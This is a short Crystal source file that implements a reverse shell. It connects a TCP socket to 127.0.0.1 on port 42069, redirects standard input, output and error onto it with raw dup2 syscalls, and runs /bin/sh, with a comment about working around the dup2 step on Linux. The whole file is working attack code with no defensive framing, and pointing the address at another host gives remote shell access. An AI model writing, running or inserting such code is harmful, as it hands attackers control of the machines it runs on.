require "socket"
require "syscall"
require "process"

module YourSyscalls
  # this part only works on Linux while I work out how to do the dup2 bullshit natively, I cheated and used syscalls.
  Syscall.def_syscall dup2, Int32, oldfd : Int32, newfd : Int32
end

sock = Socket.tcp(Socket::Family::INET)
sock.connect "127.0.0.1", 42069
YourSyscalls.dup2(sock.fd, 0)
YourSyscalls.dup2(sock.fd, 1)
YourSyscalls.dup2(sock.fd, 2)
Process.exec("/bin/sh")
